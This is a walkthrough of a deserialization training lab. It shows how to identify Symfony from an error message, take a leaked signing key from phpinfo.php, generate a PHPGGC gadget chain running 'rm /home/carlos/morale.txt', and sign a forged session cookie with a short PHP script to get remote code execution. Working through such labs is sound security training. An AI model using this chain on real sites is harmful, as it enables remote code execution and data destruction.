Title: Exploiting PHP deserialization with a pre-built gadget chain
Level: PRACTITIONER
Desc:  This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's insecure deserialization using pre-built gadget chains.
To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the morale.txt file from Carlos's home directory.
You can log in to your own account using the following credentials: wiener:peter 


# Theory
Most languages that frequently suffer from insecure deserialization vulnerabilities have equivalent proof-of-concept tools. For example, for PHP-based sites you can use "PHP Generic Gadget Chains" (PHPGGC). 

# Walkthrough:
The ookie contains a Base64-encoded token, signed with a SHA-1 HMAC hash.
<img width="1561" height="652" alt="image" src="https://github.com/user-attachments/assets/2c814989-7016-40bd-8dce-1e0e8cc1066c" />

Base64 decode the token from cookie and I can see well-known PHP object:
<img width="1101" height="249" alt="image" src="https://github.com/user-attachments/assets/e7444bbe-c1a0-4162-9d54-af203ba76093" />

Let's try to modify PHP object and send it with cookie with the same MAC signature.

After sending modified object I get an error, but in the error I can see some interesting messages. 
<img width="1408" height="683" alt="image" src="https://github.com/user-attachments/assets/2af6afe9-cf9a-4f7e-bef3-3566160fe888" />
From the error message I can see, that application use Symfony 4.3.6

In the source code of site, in the comment of developer I can find resource: `/cgi-bin/phpinfo.php`
<img width="1041" height="773" alt="image" src="https://github.com/user-attachments/assets/29bd7d74-2d4c-4e06-bc3a-79ebdde1b1d6" />

After requesting that path I can get key:
<img width="942" height="147" alt="image" src="https://github.com/user-attachments/assets/1102eb14-b1e4-4fd9-8862-0e197bae9cdb" />
`0dzx474u31ssoojwb3gmp9cnwvcap9v4`

INTRODUCTING NEW TOOL - `PHPGGC`
Running: `./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64`

<img width="764" height="275" alt="image" src="https://github.com/user-attachments/assets/d46f9bdc-fe6e-4fc0-857b-a5d3ab1703ba" />

Now let's craft cookie with our malicious payload and sign it with exfiltrated key:

```
<?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```
After sending this as a cookie, we have our RCE.


